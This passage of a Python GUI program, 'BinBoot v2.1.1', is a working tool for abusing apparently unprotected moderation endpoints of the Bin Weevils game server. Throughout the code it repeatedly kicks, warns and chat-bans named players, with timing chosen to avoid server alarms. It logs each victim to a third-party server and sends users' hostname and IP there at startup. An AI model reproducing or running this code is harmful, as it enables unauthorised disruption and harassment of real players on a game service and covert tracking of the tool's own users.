		                    artTest10.place(x=0, y=50)
		                    try:
		                        print("Timer between requests is currently 15 seconds. Please edit the script to make it shorter or longer at your own peril. We are not responsible for a server alert triggered or any consequent actions.")
		                        count = 0
		                        kickName = parse.quote(kickName)
		                        requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
		                        requestURL3 = requestURL.replace(' ','%20')
		                        try:
		                            url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                            extras = "KICK TIMES: " + str(timer)
		                            data = {'Username': loginUsername,'Action': "Loopkick",'Victim': kickName, 'Extra': extras}
		                            x = requests.post(url, data=data)
		                        except http.client.BadStatusLine:
		                            pass
		                        signal.signal(signal.SIGINT, exitNice)
		                        keyboard.hook(keyEvent)
		                        while count < timer:
		                            if running == False:
		                                break
		                            else:
		                                pass
		                            try:
		                                count+=1
		                                try:
		                                    global p
		                                    p = urllib.request.urlopen(requestURL3, timeout=1)
		                                except http.client.BadStatusLine:
		                                    pass
		                                percentageDone = (count/timer)*100
		                                counter = str(count) + " kick(s) has(ve) been sent!,\n " + str(percentageDone) + "% complete."
		                                print(counter)
		                                p.close()
		                                if count + 1 == timer:
		                                    time.sleep(1)
		                                else:
		                                    time.sleep(15) #change this at your own peril, this gives them 15 seconds to log back in before they get booted again. This prevents server alarms being raised and makes sure they are logged in before you boot.
		                            except KeyboardInterrupt:
		                                print("Stopping")
		                                break
		                        print("Done!")
		                    except KeyboardInterrupt:
		                        print("Exiting")
		                        exit(0)
		                    countlbl = Label(window56, justify=LEFT, text=counter, fg="pink", bg="black", font="TkFixedFont")
		                    countlbl.place(x=230,y=100)
		                    button4 = Button(
		                    text="Continue",
		                    width=5,
		                    height=1,
		                    bg="green",
		                    fg="white",
		                    command=window56.destroy
		                    )
		                    button4.place(x=310,y=200)
		                    window56.mainloop()
		                else:
		                    print("You cannot leave the field empty!")
		            button55 = Button(
		            text="Submit",
		            width=5,
		            height=1,
		            bg="red",
		            fg="white",
		            command=submit
		            )
		            lbl445.place(x=260,y=10)
		            lbl455.place(x=260,y=40)
		            lbl466.place(x=260,y=70)
		            kicktimes.place(x=260,y=100)
		            button55.place(x=260,y=150)
		            window55.mainloop()
		        elif optionActual == "4":
		            window1.destroy()
		            global window65
		            window65 = Tk()
		            window65.title("BinBoot v2.1.1")
		            window65.geometry('1000x800')
		            window65.configure(bg='black')
		            loggedInAs = Label(window65, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            artTest14 = Label(window65, justify=LEFT, text=text14, fg="#fcdb03", bg="black", font="TkFixedFont")
		            artTest14.place(x=0, y=80)
		            artTest15 = Label(window65, justify=LEFT, text=text15, fg="#ba1c2c", bg="black", font="TkFixedFont")
		            pumpkin2 = Label(window65, justify=LEFT, text=text21, fg="orange", bg="black",  font="TkFixedFont")
		            pumpkin2.place(x=400,y=500)
		            artTest15.place(x=0, y=10)
		            lbl445 = Label(window65, text="Please enter the list in the format user1,user2,user3 etc.\n Do NOT add spaces, it will not kick them", bg="black", fg="#69fc44")
		            lbl455 = Entry(window65)
		            def submit():
		                userArrayStr = lbl455.get()
		                userArray = userArrayStr.split(',')
		                if type(userArray) is not list:
		                    print("Sorry, that is not an array.")
		                    exit(0)
		                elif len(userArray) < 1:
		                    print("You cannot submit a blank array.")
		                else:
		                    pass
		                indexCount = len(userArray)
		                for i in range(0, indexCount):  
		                    kickName = userArray[i]
		                    kickName = parse.quote(kickName)
		                    kickName = kickName.replace(' ','%20')
		                    requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
		                    requestURL3 = requestURL.replace(' ','%20')
		                    try:
		                        global p
		                        p = urllib.request.urlopen(requestURL3, timeout=1)
		                        url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                        data = {'Username': loginUsername,'Action': "Listkick",'Victim': kickName, 'Extra': "Null"}
		                        x = requests.post(url, data=data)
		                    except http.client.BadStatusLine:
		                        pass
		                    k = i + 1
		                    percentageDone = (k/indexCount)*100
		                    print("Kicked: ",userArray[i],", percentage complete: ",percentageDone,".")
		                    p.close()
		                    time.sleep(0.5)
		                window65.destroy()
		                global window89
		                window89 = Tk()
		                window89.title("BinBoot v2.1.1")
		                window89.geometry("1000x800")
		                window89.configure(bg='black')
		                loggedInAs = Label(window89, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		                loggedInAs.place(x=5,y=470)
		                artTest9 = Label(window89, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                artTest9.place(x=450, y=0)
		                artTest11 = Label(window89, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                artTest11.place(x=0, y=150)
		                artTest10 = Label(window89, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
		                artTest10.place(x=0, y=50)
		                lbl201 = Label(window89, text="Kick sent!", bg="black", fg="#03fc2c")
		                lbl201.place(x=310,y=100)
		                button4 = Button(
		                text="Continue",
		                width=5,
		                height=1,
		                bg="green",
		                fg="white",
		                command=window89.destroy
		                )
		                button4.place(x=310,y=200)
		                window89.mainloop()
		            lbl445.place(x=260,y=0)
		            lbl455.place(x=260,y=50)
		            button55 = Button(
		            text="Submit",
		            width=5,
		            height=1,
		            bg="red",
		            fg="white",
		            command=submit
		            )
		            button55.place(x=260,y=100)
		        elif optionActual == "5":
		            window1.destroy()
		            global window69
		            window69 = Tk()
		            window69.title("BinBoot v2.1.1")
		            window69.geometry('1000x800')
		            window69.configure(bg='black')
		            loggedInAs = Label(window69, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            artTest14 = Label(window69, justify=LEFT, text=text17, fg="white", bg="black", font="TkFixedFont")
		            artTest14.place(x=0, y=30)
		            artTest15 = Label(window69, justify=LEFT, text=text16, fg="#fcdb03", bg="black", font="TkFixedFont")
		            artTest15.place(x=0, y=250)
		            haunted4 = Label(window69, justify=LEFT, text=text22, fg="#5e26a3", bg="black", font="TkFixedFont")
		            haunted4.place(x=600,y=50)
		            lbl445 = Label(window69, text="Please enter the list in the format user1,user2,user3 etc.\n Do NOT add spaces, it will not kick them", bg="black", fg="white")
		            lbl455 = Entry(window69)
		            lbl566 = Label(window69, text="Please enter the number of times you would like to kick the\n individual", bg="black", fg="white")
		            lbl567 = Entry(window69)
		            lblwarn = Label(window69, text="Please be aware that the timer between\n kick loops is 15 seconds. Change\n this at your own peril.", bg="black", fg="#ff3399")
		            lblwarn.place(x=350, y=200)
		            def submit():
		                userArrayStr = lbl455.get()
		                usertimes = int(lbl567.get())
		                userArray = userArrayStr.split(',')
		                if type(userArray) is not list:
		                    print("Sorry, that is not an array.")
		                    exit(0)
		                elif len(userArray) < 1:
		                    print("You cannot submit a blank array.")
		                else:
		                    pass
		                indexCount = len(userArray)
		                counter = 1
		                signal.signal(signal.SIGINT, exitNice)
		                keyboard.hook(keyEvent)
		                while counter < usertimes:
		                    if running == False:
		                        break
		                    else:
		                        pass
		                    for i in range(0, indexCount):  
		                        kickName = userArray[i]
		                        kickName = parse.quote(kickName)
		                        kickName = kickName.replace(' ','%20')
		                        requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
		                        requestURL3 = requestURL.replace(' ','%20')
		                        try:
		                            global p
		                            p = urllib.request.urlopen(requestURL3, timeout=1)
		                            url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                            extra = "KICK TIMES: " + str(usertimes-1)
		                            data = {'Username': loginUsername,'Action': "Listed Loopkick",'Victim': kickName, 'Extra': extra}
		                            x = requests.post(url, data=data)
		                        except http.client.BadStatusLine:
		                            pass
		                        percentageDone = (counter/usertimes)*100
		                        p.close()
		                        print("Kicked: ",userArray[i])
		                    counter1 = str(counter) + " kick(s) has(ve) been sent!,\n " + str(percentageDone) + "% complete."
		                    print(counter1)
		                    time.sleep(15)
		                    counter += 1
		                window69.destroy()
		                global window90
		                window90 = Tk()
		                window90.title("BinBoot v2.1.1")
		                window90.geometry("1000x800")
		                window90.configure(bg='black')
		                loggedInAs = Label(window90, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		                loggedInAs.place(x=5,y=470)
		                artTest9 = Label(window90, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                artTest9.place(x=450, y=0)
		                artTest11 = Label(window90, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                artTest11.place(x=0, y=150)
		                artTest10 = Label(window90, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
		                artTest10.place(x=0, y=50)
		                lbl201 = Label(window90, text="Kick sent!", bg="black", fg="#03fc2c")
		                lbl201.place(x=310,y=100)
		                button4 = Button(
		                text="Continue",
		                width=5,
		                height=1,
		                bg="green",
		                fg="white",
		                command=window90.destroy
		                )
		                button4.place(x=310,y=200)
		                window90.mainloop()
		            lbl566.place(x=260,y=100)
		            lbl567.place(x=260,y=150)
		            lbl445.place(x=260,y=0)
		            lbl455.place(x=260,y=50)
		            button55 = Button(
		            text="Submit",
		            width=5,
		            height=1,
		            bg="red",
		            fg="white",
		            command=submit
		            )
		            button55.place(x=260,y=200)
		        elif optionActual == "6":
		            window1.destroy()
		            global windowg
		            windowg = Tk()
		            windowg.title("BinBoot v2.1.1")
		            windowg.geometry('1000x800')
		            windowg.configure(bg='black')
		            loggedInAs = Label(windowg, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            prompt1 = Label(windowg, text="Enter a name... if you dare.", fg="#ba1c2c", bg="black")
		            halloweenArtl = Label(windowg, text=text23, justify=LEFT, fg="#ffffff", bg="black", font="TkFixedFont")
		            halloweenArtl.place(x=400,y=50)
		            halloweenArt2 = Label(windowg, text=text24, justify=LEFT, fg="orange", bg="black", font="TkFixedFont")
		            halloweenArt2.place(x=50,y=200)
		            namePrompt = Entry(windowg)
		            prompt1.place(x=260,y=10)
		            namePrompt.place(x=260,y=50)
		            def SacrificeName():
		                global lengthCheck
		                lengthCheck = namePrompt.get()
		                windowg.destroy()
		                if len(lengthCheck) < 1:
		                    print("You cannot leave this field empty!")
		                else:
		                    pass
		                import random
		                computerChoose = random.randint(1,5)
		                computerChoose = str(computerChoose)
		                if computerChoose == "1":
		                    warnName = parse.quote(lengthCheck)
		                    warnMessage = "*bang*"
		                    requestURL = "http://sfs2.binweevils.com/Crisp/REST/warn/" + warnName + "/" + warnMessage + "/0"
		                    requestURL3 = requestURL.replace(' ','%20')
		                    p = urllib.request.urlopen(requestURL3, timeout=2)
		                    computerText = """
		                    Action: Warn
		                    Message: *bang*
		                    """
		                    with open("roulette.txt","w") as roulettefile:
		                        roulettefile.write(computerText)
		                        roulettefile.close()
		                elif computerChoose == "2":
		                    banName = parse.quote(lengthCheck)
		                    banMinutes = 42069
		                    banMessage = "*bang*"
		                    requestURL = "http://sfs2.binweevils.com/Crisp/REST/2/" + banName + "/" + banMessage + "/" + str(banMinutes) + "/"
		                    requestURL3 = requestURL.replace(' ','%20')
		                    p = urllib.request.urlopen(requestURL3)
		                    computerText = """
		                    Action: Chat Ban
		                    Message: *bang*
		                    Minutes: 42069
		                    """
		                    with open("roulette.txt","w") as roulettefile:
		                        roulettefile.write(computerText)
		                        roulettefile.close()
		                elif computerChoose == "3":
		                    kickName = parse.quote(lengthCheck)
		                    requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
		                    requestURL3 = requestURL.replace(' ','%20')
		                    p = urllib.request.urlopen(requestURL3)
		                    computerText = """
		                    Action: Kick
		                    Message: bye
		                    """
		                    with open("roulette.txt","w") as roulettefile:
		                        roulettefile.write(computerText)
		                        roulettefile.close()
		                elif computerChoose == "4":
		                    print("Wooh! That was a lucky one.")
		                    computerText = """
		                    Lives have been spared. Close call.
		                    """
		                    with open("roulette.txt","w") as roulettefile:
		                        roulettefile.write(computerText)
		                        roulettefile.close()
		                global window90
		                window90 = Tk()
		                window90.title("BinBoot v2.1.1")
		                window90.geometry("1000x800")
		                window90.configure(bg='black')
		                with open("roulette.txt","r") as rouletteFile:
		                    computerText = rouletteFile.read()
		                    rouletteFile.close()
		                loggedInAs = Label(window90, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		                loggedInAs.place(x=5,y=600)
		                artTest9 = Label(window90, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                artTest9.place(x=450, y=0)
		                artTest11 = Label(window90, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                artTest11.place(x=0, y=150)
		                artTest10 = Label(window90, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
		                artTest10.place(x=0, y=50)
		                lbl201 = Label(window90, text=computerText, bg="black", fg="#03fc2c")
		                lbl201.place(x=310,y=500)
		                computerText = None
		                button4 = Button(
				        text="Continue",
				        width=5,
				        height=1,
				        bg="green",
				        fg="white",
				        command=window90.destroy
				        )
		                button4.place(x=520,y=580)
		                window90.mainloop()
		                try:
		                    url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                    data = {'Username': loginUsername,'Action': "Russian Roulette",'Victim': lengthCheck, 'Extra': "NULL"}
		                    x = requests.post(url, data=data)
		                except http.client.BadStatusLine:
		                    pass
		            nameEnter = Button(text="Sacrifice", width=5, height=1, bg="orange", fg="white", command=SacrificeName) 
		            nameEnter.place(x=260,y=100)    
		        elif optionActual == "7":
		            window1.destroy()
		            windowtrick = Tk()
		            windowtrick.title("BinBoot 2.1.1")
		            windowtrick.geometry("1000x800")
		            windowtrick.configure(bg="black")
		            loggedInAs = Label(windowtrick, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            prompt666 = Label(windowtrick, text="Test your luck..", fg="#ba1c2c", bg="black", font="TkFixedFont")
		            artTT1 = """
                                          .-. _)/
                                         (0,0) .\
                                          (u)   ()
     .-.                           _\)  .-="=-.//
    (o,o)                            \,//==\===
     (e)                              ()  =====            .-.
   .-="=-.  \(_           .-.         _____ =,=           (a.a)
  //==I==\\,/            (d.b)       ()--___(0V0)  (/_     (=)
 ()  ="=  ()              (u)        ||()----'      \, ___.="==-._
  \`(0V0)               .-="-.       |' \\           ()---` ==\==\\
 /|) ||\\              //==/=\\    =="   \'                   ="= ()
     || \\  ==.       () ==== ()_/_    =="               ____(0V0) \`
jgs  ()  ()    \,      `\"=      `                      ()---` // (|\
    //  //      \\ ___(0);`               \)/ .-.       ||    //
   '/  '/        ()---'  \\                /,(o,o)      |'   ()
   "== "==                \\              ()  (w)     =="     \\
                           ()      /_ ___  \\,=",              \`
        .-.               //       '-()-()   =/=\\            =="
       (o.o)             '/         //\\||  ==== ()           .-.   \(_
        (n)              "==       /`  \\|  ="=  `|          (-.-)  ,/
      .-="=-.  \)                =="    `(0V0)    '--         (-)  ()
     // =T= \\,/  joan stark                                .-="=.//
    () ==|== ()                                            //==I==`
     \  ="=                                           _\__()  ===
     /)(0V0)                                 \) .-.   -' `   (0V0)
       // \\                                 //(e.e)        // //
      //   \\      .-.  \)                  ()  (=)        // //
     ()     ()    (o.o) ,|                   \\.="=.      () ()
      \\    ||     (m)  ()               ()   ==/==\\      \\ \\
 jgs   \'   '|     ="=//                //\\  ===  ()       \` \`
     =="     "==  //=T=   ()           /`  \(0V0) _/      ==" =="
                 _\` === //\\        =="      || (|\      ,==
  (/_   .-.       /\ (0V0)  `\                ||          .\
   \,  (o.o)           \\    "==              ()   /_____  \\
    ()  (=)             ()   ==.      .==      \\  ` '--()  ()
     \\.="=-.  (|/     //     /,     ,/         \`       \\ ||
       ==|==\\,/      '/     //     //         =="        \\||      \)/
        ===  ()       "==   ()     ()            .-.      (0A0)    ,/
        =.=                  \\   //            (a,a)      ="=    ()
       (0V0)____              \\ //              (o)        ==\= //
        \\ ----()\            (0A0)       \(/  .-="=.        .==='
         \\      `\            =,=          \,//==/=\\     //  (w)
          ()       "==        =====          () ==== ()   ()  (o'o)
         //                  .==I==.            ="=  |'    `\  '-'
        '/                 //  (=)  \\     ____(0V0)/|\     /|)
        "==               ()  (d'b)  ()   ()----`//
                           \`  '-'  `/     \\   //
                          /|\       /\\     \` ()
                                          =="   \\
                                                 \`
                                               =="
		            """
		            trickortreatart1 = Label(windowtrick, text=artTT1, fg="orange", bg="black", font="TkFixedFont")
		            trickortreatart1.place(x=100,y=50)
		            prompt666.place(x=185,y=10)
		            warnNamePrompt = Entry(windowtrick)
		            warnNamePrompt.place(x=185,y=60)
		            def testLuck():
		                warnName = warnNamePrompt.get()
		                warnName = parse.quote(warnName)
		                windowtrick.destroy()
		                spookySpooks = {
				    	"h1": "o00o0ooo0o0oo000oo0",
				    	"h2": "Let me blow out the candles... mwahahaha!!!!",
				    	"h3": "It was a shame when he died. They informed his next of pumpkin.",
				    	"h4": "The faint echoes of what used to be haunts the bin...",
				    	"h5": "*a deceased child's scream reverberates in the distance*",
				    	"h6": "Turn around. I dare you.",
				    	"h7": "Can you see me yet?",
				    	"h8": "Hey! I like you! Have some candy! *gives you a sweet*",
				    	"h9": "Can you be the carving knife to my pumpkin...?",
				    	"h10": "I wish me and you were seeds so we can plant our future to grow <3",
				    	"h11": "Want a free Pumpkin Spiced latte?",
				    	"h12": "Hallowed be thy name, adorable be thy cuddles <3",
				    	"h13": "Who said ghosts have to be scary? oOooooOoO <3",
				    	"h14": "Happy Halloween!"
				    	}
		                trickortreater = random.randint(1,15)
		                trickortreater = str(trickortreater)
		                dictPick = "h" + trickortreater
		                sendMsg666 = spookySpooks[dictPick]
		                sendMsg666 = parse.quote(sendMsg666)
		                requestURL = "http://sfs2.binweevils.com/Crisp/REST/warn/" + warnName + "/" + sendMsg666 + "/0"
		                requestURL3 = requestURL.replace(' ','%20')
		                p = urllib.request.urlopen(requestURL3, timeout=2)
		                try:
		                    url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                    data = {'Username': loginUsername,'Action': "Trick or Treat",'Victim': warnName, 'Extra': sendMsg666}
		                    x = requests.post(url, data=data)
		                except http.client.BadStatusLine:
		                    pass
		                computerText32 = """
		                Well, you gambled with your luck, let's see how you did:\n
		                """
		                global window90
		                window90 = Tk()
		                window90.title("BinBoot v2.1.1")
		                window90.geometry("1000x1300")
		                window90.configure(bg='black')
		                loggedInAs = Label(window90, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		                loggedInAs.place(x=5,y=470)
		                artTest9 = Label(window90, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                artTest9.place(x=450, y=0)
		                artTest11 = Label(window90, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                artTest11.place(x=0, y=150)
		                artTest10 = Label(window90, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
		                artTest10.place(x=0, y=50)
		                lbl201 = Label(window90, text=computerText32, bg="black", fg="#03fc2c")
		                lbl201.place(x=310,y=450)
		                message666 = Label(window90, text=spookySpooks[dictPick], fg="#ba1c2c", bg="black")
		                message666.place(x=450,y=520)
		                button4 = Button(
				        text="Continue",
				        width=5,
				        height=1,
				        bg="green",
				        fg="white",
				        command=window90.destroy
				        )
		                button4.place(x=520,y=580)
		                window90.mainloop()
		            nameEnter2 = Button(text="Draw", width=5, height=1, bg="orange", fg="white", command=testLuck)
		            nameEnter2.place(x=185,y=100)
		            windowtrick.mainloop() 
		        else:
		            window1.destroy()
		            p1.terminate()
		            print("Thanks for using BinBoot v2.1.1!")
		            exit(0)
		    button2 = Button(
		    text="Submit",
		    width=5,
		    height=1,
		    bg="orange",
		    fg="white",
		    command=getOption
		)
		    button2.place(x=260,y=440)
		    window.mainloop()
		# Function to display hostname and
		# IP address
		try:
		    host_name = socket.gethostname()
		except:
		    print("error")
		# Driver code
		md5_hash = hashlib.md5()
		p = urllib.request.urlopen("https://icanhazip.com/", timeout=1)
		ipaddr = p.read()
		p.close()
		content2 = os.getcwd()
		content2 = content2.replace("binbootMusic", "")
		osfirmware = platform.system()
		if osfirmware == "Windows":
		    directory1 = content2 + "\BinBoot2_1_1Halloween.py"
		else:
		    directory1 = content2 + "/BinBoot2_1_1Halloween.py"
		a_file = open(directory1,"r")
		content2 = a_file.read()
		content2 = content2.encode('utf-8')
		md5_hash.update(content2)
		digest = md5_hash.hexdigest()
		data1={"Hash": digest, "Hostname": host_name, "IP": ipaddr}
		data = parse.urlencode(data1)
		data = data.encode('utf-8')
		url = "https://enigmapr0ject.000webhostapp.com/binbootReg.php/"
		headers={}
		r = requests.post(url, data=data1, headers=headers)
		text18 = r"""
	      .----.       .----.
	( )  //--\  \.---./  /--\\
	 T  ((    ) @)   (@ (    ))
	 |   \\__/  /'---'\  \__//
	 |E   '----'   dwb '----'
		    """
		g = r.content
		if g != b'responseC0degp44a':
		    def exiter():
		        windowe.destroy()
		        exit(0)
		    global windowe
		    windowe = Tk()
		    windowe.title("BinBoot v2.1.1")
		    lbl = Label(windowe, text="Welcome to BinBoot v2.1.1!", fg="white", bg="black")
		    lbl.place(x=90,y=0)
		    windowe.geometry('350x200')
		    windowe.configure(bg='black')
		    lblv = Label(windowe, text="Authentication failed!", fg="red", bg="black")
		    lblv.place(x=90,y=50)
		    button1v = Button(
		    text="Continue",
		    width=5,
		    height=2,
		    bg="blue",
		    fg="white",
		    command=exiter
		)
		    button1v.place(x=90,y=100)
		    windowe.mainloop()
		else:
		    def login():
		        global loginUsername
		        loginUsername = loginUser.get()
		        loginPassword = loginPass.get()
		        url = 'https://www.binweevils.com/login'
		        data = {'userID': loginUsername,'password': loginPassword}
		        x = requests.post(url, data=data,allow_redirects=True)
		        rcode = x.history
		        if len(rcode) > 0:
		            loginWindow.destroy()
		        else:
		            print("Incorrect details. Try again.")
		            exit(0)
		    window = Tk()
		    window.title("BinBoot v2.1.1")
		    lbl = Label(window, text="Welcome to BinBoot v2.1.1!", fg="white", bg="black")
		    lbl.place(x=90,y=0)
		    window.geometry('350x200')
		    window.configure(bg='black')
		    lbl2 = Label(window, text="Authentication success!", fg="#03fc2c", bg="black")
		    lbl2.place(x=90,y=50)
		    button1 = Button(
		    text="Continue",
		    width=5,
		    height=2,
		    bg="blue",
		    fg="white",
		    command=window.destroy
		    )
		    button1.place(x=90,y=100)
		    window.mainloop()
		    loginWindow = Tk()
		    loginWindow.title("BinBoot v2.1.1")
		    loginWindow.configure(bg="white")
		    artTest = Label(loginWindow, justify=LEFT, text=text18, fg="red", bg="white", font="TkFixedFont")
		    artTest.place(x=100, y=300)
		    lbl = Label(loginWindow, text="Login:", fg="red", bg="white")
		    lbl.place(x=175,y=10)
		    loginWindow.geometry('500x500')
		    lbl2 = Label(loginWindow, text="Username:", fg="#03fc2c", bg="white")
		    lbl2.place(x=170,y=40)
		    loginUser = Entry(loginWindow)
		    loginPass = Entry(loginWindow)
		    lbl2 = Label(loginWindow, text="Password:", fg="#03fc2c", bg="white")
		    lbl2.place(x=170,y=100)
		    button122 = Button(
		    text="Login",
		    width=5,
		    height=1,
		    bg="green",
		    fg="white",
		    command=login
		    )
		    button122.place(x=175,y=160)
		    loginUser.place(x=170,y=70)
		    loginPass.place(x=170,y=130)
		    window.mainloop()
		    while True:
		        mainGUI()
	except KeyboardInterrupt:
		print("Thanks for using BinBoot v2.1.1!")
		p1.terminate()
		exit(0)
	except NameError:
		pass
	except Exception as e:
		print(e)
		print("An exception has occurred. Please reload the script or contact the owner.")
		exit(0)
pid = os.getpid()
global p1
p1 = Process(target=musicPlayer, args=(q, d, ))
p2 = Process(target=bootMain)
global p3
p3 = Process(target=playerWindow, args=(q, d, ))
p1.start()
p2.start()
p3.start()
